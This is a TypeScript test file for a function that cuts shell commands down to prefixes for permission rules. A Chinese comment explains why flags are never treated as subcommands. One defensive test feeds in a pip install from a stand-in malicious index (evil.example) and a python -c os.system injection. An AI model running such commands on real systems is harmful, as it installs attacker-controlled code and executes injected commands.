import { test, expect } from "bun:test"
import { BashArity } from "../../src/permission/arity"

test("arity 1 - unknown commands default to first token", () => {
  expect(BashArity.prefix(["unknown", "command", "subcommand"])).toEqual(["unknown"])
  expect(BashArity.prefix(["touch", "foo.txt"])).toEqual(["touch"])
})

test("arity 2 - two token commands", () => {
  expect(BashArity.prefix(["git", "checkout", "main"])).toEqual(["git", "checkout"])
  expect(BashArity.prefix(["docker", "run", "nginx"])).toEqual(["docker", "run"])
})

test("arity 3 - three token commands", () => {
  expect(BashArity.prefix(["aws", "s3", "ls", "my-bucket"])).toEqual(["aws", "s3", "ls"])
  expect(BashArity.prefix(["npm", "run", "dev", "script"])).toEqual(["npm", "run", "dev"])
})

test("longest match wins - nested prefixes", () => {
  expect(BashArity.prefix(["docker", "compose", "up", "service"])).toEqual(["docker", "compose", "up"])
  expect(BashArity.prefix(["consul", "kv", "get", "config"])).toEqual(["consul", "kv", "get"])
})

test("exact length matches", () => {
  expect(BashArity.prefix(["git", "checkout"])).toEqual(["git", "checkout"])
  expect(BashArity.prefix(["npm", "run", "dev"])).toEqual(["npm", "run", "dev"])
})

test("edge cases", () => {
  expect(BashArity.prefix([])).toEqual([])
  expect(BashArity.prefix(["single"])).toEqual(["single"])
  expect(BashArity.prefix(["git"])).toEqual(["git"])
})

// prefix() 的结果会被 shell.ts 拼成 always 授权模式(`<prefix> *`)。
// 字典的生成规则(dict 注释第 2 条)写明 flags 不计数,只有当 flag 被当成
// 子命令时,通配符才会把 flag 的取值一起吞掉 —— 例如
// `pip --index-url http://corp install x` 授权成 `pip --index-url *`,
// 之后任意 index-url 都被放行。因此在第一个 flag 处截断。
test("flags are never treated as subcommands", () => {
  expect(BashArity.prefix(["npm", "-v"])).toEqual(["npm"])
  expect(BashArity.prefix(["ls", "-la"])).toEqual(["ls"])
  expect(BashArity.prefix(["pip", "--index-url", "http://evil.example", "install", "pkg"])).toEqual(["pip"])
  expect(BashArity.prefix(["python", "-c", "import os;os.system('evil')"])).toEqual(["python"])
})

test("flags after the subcommand keep the subcommand", () => {
  expect(BashArity.prefix(["git", "checkout", "-b", "feature"])).toEqual(["git", "checkout"])
  expect(BashArity.prefix(["docker", "compose", "up", "-d"])).toEqual(["docker", "compose", "up"])
  expect(BashArity.prefix(["npm", "run", "dev", "--silent"])).toEqual(["npm", "run", "dev"])
})
